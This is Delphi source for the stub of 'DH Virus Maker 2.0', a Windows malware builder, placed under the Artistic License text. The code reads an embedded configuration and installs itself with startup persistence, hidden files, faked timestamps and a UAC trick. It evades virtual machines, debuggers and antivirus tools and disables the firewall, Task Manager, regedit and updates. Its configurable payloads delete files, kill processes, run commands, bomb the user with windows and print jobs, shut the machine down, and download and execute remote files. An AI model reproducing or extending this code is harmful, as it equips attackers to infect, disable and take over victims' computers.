{
  This software is Copyright (c) 2016 by Doddy Hackman.
  This is free software, licensed under:
  The Artistic License 2.0
  The Artistic License
  Preamble
  This license establishes the terms under which a given free software Package may be copied, modified, distributed, and/or redistributed. The intent is that the Copyright Holder maintains some artistic control over the development of that Package while still keeping the Package available as open source and free software.
  You are always permitted to make arrangements wholly outside of this license directly with the Copyright Holder of a given Package. If the terms of this license do not permit the full use that you propose to make of the Package, you should contact the Copyright Holder and seek a different licensing arrangement.
  Definitions
  "Copyright Holder" means the individual(s) or organization(s) named in the copyright notice for the entire Package.
  "Contributor" means any party that has contributed code or other material to the Package, in accordance with the Copyright Holder's procedures.
  "You" and "your" means any person who would like to copy, distribute, or modify the Package.
  "Package" means the collection of files distributed by the Copyright Holder, and derivatives of that collection and/or of those files. A given Package may consist of either the Standard Version, or a Modified Version.
  "Distribute" means providing a copy of the Package or making it accessible to anyone else, or in the case of a company or organization, to others outside of your company or organization.
  "Distributor Fee" means any fee that you charge for Distributing this Package or providing support for this Package to another party. It does not mean licensing fees.
  "Standard Version" refers to the Package if it has not been modified, or has been modified only in ways explicitly requested by the Copyright Holder.
  "Modified Version" means the Package, if it has been changed, and such changes were not explicitly requested by the Copyright Holder.
  "Original License" means this Artistic License as Distributed with the Standard Version of the Package, in its current version or as it may be modified by The Perl Foundation in the future.
  "Source" form means the source code, documentation source, and configuration files for the Package.
  "Compiled" form means the compiled bytecode, object code, binary, or any other form resulting from mechanical transformation or translation of the Source form.
  Permission for Use and Modification Without Distribution
  (1) You are permitted to use the Standard Version and create and use Modified Versions for any purpose without restriction, provided that you do not Distribute the Modified Version.
  Permissions for Redistribution of the Standard Version
  (2) You may Distribute verbatim copies of the Source form of the Standard Version of this Package in any medium without restriction, either gratis or for a Distributor Fee, provided that you duplicate all of the original copyright notices and associated disclaimers. At your discretion, such verbatim copies may or may not include a Compiled form of the Package.
  (3) You may apply any bug fixes, portability changes, and other modifications made available from the Copyright Holder. The resulting Package will still be considered the Standard Version, and as such will be subject to the Original License.
  Distribution of Modified Versions of the Package as Source
  (4) You may Distribute your Modified Version as Source (either gratis or for a Distributor Fee, and with or without a Compiled form of the Modified Version) provided that you clearly document how it differs from the Standard Version, including, but not limited to, documenting any non-standard features, executables, or modules, and provided that you do at least ONE of the following:
  (a) make the Modified Version available to the Copyright Holder of the Standard Version, under the Original License, so that the Copyright Holder may include your modifications in the Standard Version.
  (b) ensure that installation of your Modified Version does not prevent the user installing or running the Standard Version. In addition, the Modified Version must bear a name that is different from the name of the Standard Version.
  (c) allow anyone who receives a copy of the Modified Version to make the Source form of the Modified Version available to others under
  (i) the Original License or
  (ii) a license that permits the licensee to freely copy, modify and redistribute the Modified Version using the same licensing terms that apply to the copy that the licensee received, and requires that the Source form of the Modified Version, and of any works derived from it, be made freely available in that license fees are prohibited but Distributor Fees are allowed.
  Distribution of Compiled Forms of the Standard Version or Modified Versions without the Source
  (5) You may Distribute Compiled forms of the Standard Version without the Source, provided that you include complete instructions on how to get the Source of the Standard Version. Such instructions must be valid at the time of your distribution. If these instructions, at any time while you are carrying out such distribution, become invalid, you must provide new instructions on demand or cease further distribution. If you provide valid instructions or cease distribution within thirty days after you become aware that the instructions are invalid, then you do not forfeit any of your rights under this license.
  (6) You may Distribute a Modified Version in Compiled form without the Source, provided that you comply with Section 4 with respect to the Source of the Modified Version.
  Aggregating or Linking the Package
  (7) You may aggregate the Package (either the Standard Version or Modified Version) with other packages and Distribute the resulting aggregation provided that you do not charge a licensing fee for the Package. Distributor Fees are permitted, and licensing fees for other components in the aggregation are permitted. The terms of this license apply to the use and Distribution of the Standard or Modified Versions as included in the aggregation.
  (8) You are permitted to link Modified and Standard Versions with other works, to embed the Package in a larger work of your own, or to build stand-alone binary or bytecode versions of applications that include the Package, and Distribute the result without restriction, provided the result does not expose a direct interface to the Package.
  Items That are Not Considered Part of a Modified Version
  (9) Works (including, but not limited to, modules and scripts) that merely extend or make use of the Package, do not, by themselves, cause the Package to be a Modified Version. In addition, such works are not considered parts of the Package itself, and are not subject to the terms of this license.
  General Provisions
  (10) Any use, modification, and distribution of the Standard or Modified Versions is governed by this Artistic License. By using, modifying or distributing the Package, you accept this license. Do not use, modify, or distribute the Package, if you do not accept this license.
  (11) If your Modified Version has been derived from a Modified Version made by someone other than you, you are nevertheless required to ensure that your Modified Version complies with the requirements of this license.
  (12) This license does not grant you the right to use any trademark, service mark, tradename, or logo of the Copyright Holder.
  (13) This license includes the non-exclusive, worldwide, free-of-charge patent license to make, have made, use, offer to sell, sell, import and otherwise transfer the Package with respect to any patent claims licensable by the Copyright Holder that are necessarily infringed by the Package. If you institute patent litigation (including a cross-claim or counterclaim) against any party alleging that the Package constitutes direct or contributory patent infringement, then this Artistic License to you shall terminate on the date that such litigation is filed.
  (14) Disclaimer of Warranty: THE PACKAGE IS PROVIDED BY THE COPYRIGHT HOLDER AND CONTRIBUTORS "AS IS' AND WITHOUT ANY EXPRESS OR IMPLIED WARRANTIES. THE IMPLIED WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE, OR NON-INFRINGEMENT ARE DISCLAIMED TO THE EXTENT PERMITTED BY YOUR LOCAL LAW. UNLESS REQUIRED BY LAW, NO COPYRIGHT HOLDER OR CONTRIBUTOR WILL BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, OR CONSEQUENTIAL DAMAGES ARISING IN ANY WAY OUT OF THE USE OF THE PACKAGE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
}

// DH Virus Maker 2.0
// (C) Doddy Hackman 2016

program stub;

// {$APPTYPE CONSOLE}
{$R *.res}

uses
  System.SysUtils, DH_Builder_Tools,
  DH_Auxiliar_Tools, DH_Installer, DH_Malware_Functions, DH_Malware_Disables,
  WinInet, Windows;

var
  msg: TMsg;
  logs: string;

var
  op_deletefile, op_kill_process, op_execute_command, op_open_cd, op_hide_icons,
    op_hide_taskbar, op_messages_single, op_messages_bomber, op_sendkeys,
    op_write_word, op_crazy_mouse, op_crazy_hour, op_shutdown, op_reboot,
    op_close_session, op_open_url, op_load_paint, op_edit_taskbar_text,
    op_turn_off_monitor, op_speak, op_play_beeps, op_block_all,
    op_change_wallpaper, op_change_screensaver, op_printer_bomber,
    op_form_bomber, op_html_bomber, op_windows_bomber,
    op_download_and_execute: string;

var
  file_to_delete, process_name, command_to_execute, message_single_title,
    message_single_content, message_bomber_title, message_bomber_content,
    message_bomber_count, text_to_send, word_text_to_send, mouse_count,
    hour_count, url_to_open, new_taskbar_text, text_to_speak, beeps_count,
    url_wallpaper, url_screensaver, file_to_print, printer_bomber_count,
    form_bomber_title, form_bomber_content, form_bomber_count,
    html_bomber_title, html_bomber_content, html_bomber_count, windows_count,
    url_download, new_name: string;

var
  contenido: string;
  builder_tools: T_DH_Builder_Tools;
  installer: T_DH_Installer;
  malware: T_DH_Malware_Functions;
  disable: T_DH_Malware_Disables;
  active: string;

var
  op_hide_files, op_use_startup, op_use_special_path, op_use_this_path,
    op_use_uac_tricky, op_uac_tricky_continue_if_off, op_uac_tricky_exit_if_off,
    op_use_this_datetime, creation_time, modified_time, last_access,
    special_path, path, folder, op_anti_virtual_pc, op_anti_virtual_box,
    op_anti_debug, op_anti_wireshark, op_anti_ollydbg, op_anti_anubis,
    op_anti_kaspersky, op_anti_vmware, op_disable_uac, op_disable_firewall,
    op_disable_cmd, op_disable_run, op_disable_taskmgr, op_disable_regedit,
    op_disable_updates, op_disable_msconfig: string;

  // Functions

function regex(text: String; deaca: String; hastaaca: String): String;
begin
  Delete(text, 1, AnsiPos(deaca, text) + Length(deaca) - 1);
  SetLength(text, AnsiPos(hastaaca, text) - 1);
  Result := text;
end;

// End of Functions

begin
  try

    builder_tools := T_DH_Builder_Tools.Create();

    contenido := builder_tools.read_resource(666);

    if not(contenido = '') then
    begin

      active := regex(contenido, '[active]', '[active]');

      op_deletefile := regex(contenido, '[op_deletefile]', '[op_deletefile]');
      file_to_delete := regex(contenido, '[file_to_delete]',
        '[file_to_delete]');
      op_kill_process := regex(contenido, '[op_kill_process]',
        '[op_kill_process]');
      process_name := regex(contenido, '[process_name]', '[process_name]');
      op_execute_command := regex(contenido, '[op_execute_command]',
        '[op_execute_command]');
      command_to_execute := regex(contenido, '[command_to_execute]',
        '[command_to_execute]');
      op_open_cd := regex(contenido, '[op_open_cd]', '[op_open_cd]');
      op_hide_icons := regex(contenido, '[op_hide_icons]', '[op_hide_icons]');
      op_hide_taskbar := regex(contenido, '[op_hide_taskbar]',
        '[op_hide_taskbar]');
      op_messages_single := regex(contenido, '[op_messages_single]',
        '[op_messages_single]');
      message_single_title := regex(contenido, '[message_single_title]',
        '[message_single_title]');
      message_single_content := regex(contenido, '[message_single_content]',
        '[message_single_content]');
      op_messages_bomber := regex(contenido, '[op_messages_bomber]',
        '[op_messages_bomber]');
      message_bomber_title := regex(contenido, '[message_bomber_title]',
        '[message_bomber_title]');
      message_bomber_content := regex(contenido, '[message_bomber_content]',
        '[message_bomber_content]');
      message_bomber_count := regex(contenido, '[message_bomber_count]',
        '[message_bomber_count]');
      op_sendkeys := regex(contenido, '[op_sendkeys]', '[op_sendkeys]');
      text_to_send := regex(contenido, '[text_to_send]', '[text_to_send]');
      op_write_word := regex(contenido, '[op_write_word]', '[op_write_word]');
      word_text_to_send := regex(contenido, '[word_text_to_send]',
        '[word_text_to_send]');
      op_crazy_mouse := regex(contenido, '[op_crazy_mouse]',
        '[op_crazy_mouse]');
      mouse_count := regex(contenido, '[mouse_count]', '[mouse_count]');
      op_crazy_hour := regex(contenido, '[op_crazy_hour]', '[op_crazy_hour]');
      hour_count := regex(contenido, '[hour_count]', '[hour_count]');
      op_shutdown := regex(contenido, '[op_shutdown]', '[op_shutdown]');
      op_close_session := regex(contenido, '[op_close_session]',
        '[op_close_session]');
      op_open_url := regex(contenido, '[op_open_url]', '[op_open_url]');
      url_to_open := regex(contenido, '[url_to_open]', '[url_to_open]');
      op_load_paint := regex(contenido, '[op_load_paint]', '[op_load_paint]');
      op_edit_taskbar_text := regex(contenido, '[op_edit_taskbar_text]',
        '[op_edit_taskbar_text]');
      new_taskbar_text := regex(contenido, '[new_taskbar_text]',
        '[new_taskbar_text]');
      op_turn_off_monitor := regex(contenido, '[op_turn_off_monitor]',
        '[op_turn_off_monitor]');
      op_speak := regex(contenido, '[op_speak]', '[op_speak]');
      text_to_speak := regex(contenido, '[text_to_speak]', '[text_to_speak]');
      op_play_beeps := regex(contenido, '[op_play_beeps]', '[op_play_beeps]');
      beeps_count := regex(contenido, '[beeps_count]', '[beeps_count]');
      op_block_all := regex(contenido, '[op_block_all]', '[op_block_all]');
      op_change_wallpaper := regex(contenido, '[op_change_wallpaper]',
        '[op_change_wallpaper]');
      url_wallpaper := regex(contenido, '[url_wallpaper]', '[url_wallpaper]');
      op_change_screensaver := regex(contenido, '[op_change_screensaver]',
        '[op_change_screensaver]');
      url_screensaver := regex(contenido, '[url_screensaver]',
        '[url_screensaver]');
      op_printer_bomber := regex(contenido, '[op_printer_bomber]',
        '[op_printer_bomber]');
      file_to_print := regex(contenido, '[file_to_print]', '[file_to_print]');
      printer_bomber_count := regex(contenido, '[printer_bomber_count]',
        '[printer_bomber_count]');
      op_form_bomber := regex(contenido, '[op_form_bomber]',
        '[op_form_bomber]');
      form_bomber_title := regex(contenido, '[form_bomber_title]',
        '[form_bomber_title]');
      form_bomber_content := regex(contenido, '[form_bomber_content]',
        '[form_bomber_content]');
      form_bomber_count := regex(contenido, '[form_bomber_count]',
        '[form_bomber_count]');
      op_html_bomber := regex(contenido, '[op_html_bomber]',
        '[op_html_bomber]');
      html_bomber_title := regex(contenido, '[html_bomber_title]',
        '[html_bomber_title]');
      html_bomber_content := regex(contenido, '[html_bomber_content]',
        '[html_bomber_content]');
      html_bomber_count := regex(contenido, '[html_bomber_count]',
        '[html_bomber_count]');
      op_windows_bomber := regex(contenido, '[op_windows_bomber]',
        '[op_windows_bomber]');
      windows_count := regex(contenido, '[windows_count]', '[windows_count]');
      op_download_and_execute := regex(contenido, '[op_download_and_execute]',
        '[op_download_and_execute]');
      url_download := regex(contenido, '[url_download]', '[url_download]');
      new_name := regex(contenido, '[new_name]', '[new_name]');

      //

      op_hide_files := regex(contenido, '[op_hide_files]', '[op_hide_files]');
      op_use_startup := regex(contenido, '[op_use_startup]',
        '[op_use_startup]');

      op_use_special_path := regex(contenido, '[op_use_special_path]',
        '[op_use_special_path]');
      op_use_this_path := regex(contenido, '[op_use_this_path]',
        '[op_use_this_path]');
      special_path := regex(contenido, '[special_path]', '[special_path]');
      path := regex(contenido, '[path]', '[path]');
      folder := regex(contenido, '[folder]', '[folder]');

      op_use_uac_tricky := regex(contenido, '[op_use_uac_tricky]',
        '[op_use_uac_tricky]');
      op_uac_tricky_continue_if_off :=
        regex(contenido, '[op_uac_tricky_continue_if_off]',
        '[op_uac_tricky_continue_if_off]');
      op_uac_tricky_exit_if_off :=
        regex(contenido, '[op_uac_tricky_exit_if_off]',
        '[op_uac_tricky_exit_if_off]');

      op_use_this_datetime := regex(contenido, '[op_use_this_datetime]',
        '[op_use_this_datetime]');
      creation_time := regex(contenido, '[creation_time]', '[creation_time]');
      modified_time := regex(contenido, '[modified_time]', '[modified_time]');
      last_access := regex(contenido, '[last_access]', '[last_access]');

      op_anti_virtual_pc := regex(contenido, '[op_anti_virtual_pc]',
        '[op_anti_virtual_pc]');
      op_anti_virtual_box := regex(contenido, '[op_anti_virtual_box]',
        '[op_anti_virtual_box]');
      op_anti_debug := regex(contenido, '[op_anti_debug]', '[op_anti_debug]');
      op_anti_wireshark := regex(contenido, '[op_anti_wireshark]',
        '[op_anti_wireshark]');
      op_anti_ollydbg := regex(contenido, '[op_anti_ollydbg]',
        '[op_anti_ollydbg]');
      op_anti_anubis := regex(contenido, '[op_anti_anubis]',
        '[op_anti_anubis]');
      op_anti_kaspersky := regex(contenido, '[op_anti_kaspersky]',
        '[op_anti_kaspersky]');
      op_anti_vmware := regex(contenido, '[op_anti_vmware]',
        '[op_anti_vmware]');

      op_disable_uac := regex(contenido, '[op_disable_uac]',
        '[op_disable_uac]');
      op_disable_firewall := regex(contenido, '[op_disable_firewall]',
        '[op_disable_firewall]');
      op_disable_cmd := regex(contenido, '[op_disable_cmd]',
        '[op_disable_cmd]');
      op_disable_run := regex(contenido, '[op_disable_run]',
        '[op_disable_run]');
      op_disable_taskmgr := regex(contenido, '[op_disable_taskmgr]',
        '[op_disable_taskmgr]');
      op_disable_regedit := regex(contenido, '[op_disable_regedit]',
        '[op_disable_regedit]');
      op_disable_updates := regex(contenido, '[op_disable_updates]',
        '[op_disable_updates]');
      op_disable_msconfig := regex(contenido, '[op_disable_msconfig]',
        '[op_disable_msconfig]');

      if (active = '1') then
      begin
        installer := T_DH_Installer.Create();

        installer.set_UAC_Tricky(op_use_uac_tricky,
          op_uac_tricky_continue_if_off, op_uac_tricky_exit_if_off, '1');
        installer.setAntis(op_anti_virtual_pc, op_anti_virtual_box,
          op_anti_debug, op_anti_wireshark, op_anti_ollydbg, op_anti_anubis,
          op_anti_kaspersky, op_anti_vmware);
        installer.setDisables(op_disable_uac, op_disable_firewall,
          op_disable_cmd, op_disable_run, op_disable_taskmgr,
          op_disable_regedit, op_disable_updates, op_disable_msconfig);
        installer.setMoveFile(op_use_special_path, op_use_this_path,
          special_path, path, folder, 'vgh.exe');
        installer.setHide(op_hide_files);
        installer.setStartup(op_use_startup, 'vgh');
        installer.setDateTime(op_use_this_datetime, creation_time,
          modified_time, last_access);

        logs := installer.Install();

        installer.Free();
        builder_tools.Free();

        // Main

        malware := T_DH_Malware_Functions.Create();
        disable := T_DH_Malware_Disables.Create();

        if (op_deletefile = '1') then
        begin
          malware.delete_filename(file_to_delete);
        end;

        if (op_kill_process = '1') then
        begin
          malware.kill_process(process_name);
        end;

        if (op_execute_command = '1') then
        begin
          malware.execute_command(command_to_execute);
        end;

        if (op_open_cd = '1') then
        begin
          malware.cd_manager('open');
        end;

        if (op_hide_icons = '1') then
        begin
          malware.icons_manager('hide');
        end;

        if (op_hide_taskbar = '1') then
        begin
          malware.taskbar_manager('hide');
        end;

        if (op_messages_single = '1') then
        begin
          malware.message_box(message_single_title, message_single_content,
            'Information');
        end;

        if (op_messages_bomber = '1') then
        begin
          malware.message_box_bomber(message_bomber_title,
            message_bomber_content, 'Information',
            StrToInt(message_bomber_count));
        end;

        if (op_sendkeys = '1') then
        begin
          malware.SendKeys(text_to_send);
        end;

        if (op_write_word = '1') then
        begin
          malware.write_word(word_text_to_send);
        end;

        if (op_crazy_mouse = '1') then
        begin
          malware.crazy_mouse(StrToInt(mouse_count));
        end;

        if (op_crazy_hour = '1') then
        begin
          malware.crazy_hour(StrToInt(hour_count));
        end;

        if (op_shutdown = '1') then
        begin
          malware.shutdown();
        end;

        if (op_reboot = '1') then
        begin
          malware.reboot();
        end;

        if (op_close_session = '1') then
        begin
          malware.close_session();
        end;

        if (op_open_url = '1') then
        begin
          malware.load_page(url_to_open);
        end;

        if (op_load_paint = '1') then
        begin
          malware.load_paint();
        end;

        if (op_edit_taskbar_text = '1') then
        begin
          malware.edit_taskbar_text('on', new_taskbar_text);
        end;

        if (op_turn_off_monitor = '1') then
        begin
          malware.turn_off_monitor();
        end;

        if (op_speak = '1') then
        begin
          malware.speak(text_to_speak);
        end;

        if (op_play_beeps = '1') then
        begin
          malware.play_beep(StrToInt(beeps_count));
        end;

        if (op_block_all = '1') then
        begin
          malware.block_all('on');
        end;

        if (op_change_wallpaper = '1') then
        begin
          malware.download_and_change_wallpaper(url_wallpaper);
        end;

        if (op_change_screensaver = '1') then
        begin
          malware.download_and_change_screensaver(url_screensaver);
        end;

        if (op_printer_bomber = '1') then
        begin
          malware.printer_bomber(file_to_print, StrToInt(printer_bomber_count));
        end;

        if (op_form_bomber = '1') then
        begin
          malware.form_bomber(form_bomber_title, form_bomber_content, '', '', 0,
            0, StrToInt(form_bomber_count));
        end;

        if (op_html_bomber = '1') then
        begin
          malware.html_bomber(html_bomber_title, html_bomber_content, '',
            StrToInt(html_bomber_count));
        end;

        if (op_windows_bomber = '1') then
        begin
          malware.windows_bomber(StrToInt(windows_count));
        end;

        if (op_download_and_execute = '1') then
        begin
          malware.download_and_execute(url_download, new_name);
        end;

        malware.Free();
        disable.Free();

        while GetMessage(msg, 0, 0, 0) do
        begin
          TranslateMessage(msg);
          DispatchMessage(msg);
        end;

        ExitProcess(0);

        // End of Main

      end;

    end
    else
    begin
      ExitProcess(0);
    end;

  except
    begin
      //
    end;
  end;

end.

// The End ?
